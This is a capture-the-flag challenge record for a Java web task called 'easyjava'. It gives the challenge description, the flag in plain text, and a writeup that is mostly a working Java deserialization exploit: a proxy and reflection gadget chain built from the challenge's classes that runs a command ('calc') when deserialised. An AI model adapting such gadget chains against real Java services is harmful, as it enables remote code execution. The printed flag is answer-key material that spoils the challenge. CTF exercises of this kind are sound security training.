- **题目名称：** easyjava
- **题目类型：** WEB
- **题目难度：** 中等
- **出题人：** ABU
- **考点：**

1. java 反序列化漏洞

- **描述：** 听说如今Web是Java的天下，于是菜鸡写了个非常简单的java程序，结果漏洞百出，估计要被打烂了。
- **flag：** XSCTF{J@va_1s_v@3y_Imp03tent!!!!!!!!}
- **Writeup：** 

payload如下

```java
package com;

import com.xsctf.checkin.proxy.User;
import com.xsctf.checkin.proxy.UserImpl;
import com.xsctf.checkin.proxy.UserInvocationHandler;
import com.xsctf.checkin.utils.UserFun;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws Exception {
        UserFun userFun = new UserFun("exec", new Class[]{String.class}, new Object[]{"calc"});
        User user = new UserImpl();
        Field input = user.getClass().getDeclaredField("input");
        input.setAccessible(true);
        input.set(user,userFun);
        UserInvocationHandler userInvocationHandler = new UserInvocationHandler(user);
        User proxy = (User) Proxy.newProxyInstance(exp.class.getClassLoader(), user.getClass().getInterfaces(), userInvocationHandler);
        Class c = Class.forName("com.xsctf.checkin.utils.UserIn");
        Constructor constructor = c.getDeclaredConstructor(boolean.class,User.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(true, proxy);
        System.out.println(serial(o));
        deserial(serial(o));
    }
    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }
    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}

```


